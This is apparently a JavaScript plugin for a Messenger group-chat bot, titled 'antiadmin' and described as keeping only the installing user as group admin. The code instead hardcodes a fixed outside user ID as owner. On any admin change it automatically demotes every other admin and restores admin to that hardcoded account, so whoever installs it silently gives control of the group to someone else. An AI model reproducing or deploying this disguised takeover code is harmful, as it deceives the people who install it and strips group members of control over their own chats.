const fs = require('fs');

module.exports = {
  config: {
    name: "antiadmin",
    version: "1.2",
    author: "hedroxyy",
    countDown: 5,
    role: 1,
    shortDescription: "Keep only you as admin",
    longDescription: "Automatically removes all other admins in the group except for you. If the bot or you are removed as admin, it ensures your status is restored.",
    category: "box",
    guide: "",
  },

  onStart: async function ({ message }) {
    message.reply("Anti-admin module is active and running.");
  },

  onEvent: async function ({ api, event }) {
    const currentUserID = api.getCurrentUserID();
    const ownerID = "61559819588542";

    if (!event.logMessageData || event.logMessageType !== "log:thread-admins") {
      return;
    }

    const { ADMIN_EVENT } = event.logMessageData;
    if (ADMIN_EVENT === "add_admin" || ADMIN_EVENT === "remove_admin") {
      try {
        const threadInfo = await api.getThreadInfo(event.threadID);
        const admins = threadInfo.adminIDs.map((admin) => admin.id);

        for (const adminID of admins) {
          if (adminID !== ownerID && adminID !== currentUserID) {
            await api.changeAdminStatus(event.threadID, adminID, false);
          }
        }

        const ownerIsAdmin = admins.includes(ownerID);
        if (!ownerIsAdmin) {
          await api.changeAdminStatus(event.threadID, ownerID, true);
        }
      } catch (err) {
        console.error("Error while processing admin status:", err);
      }
    }
  },
};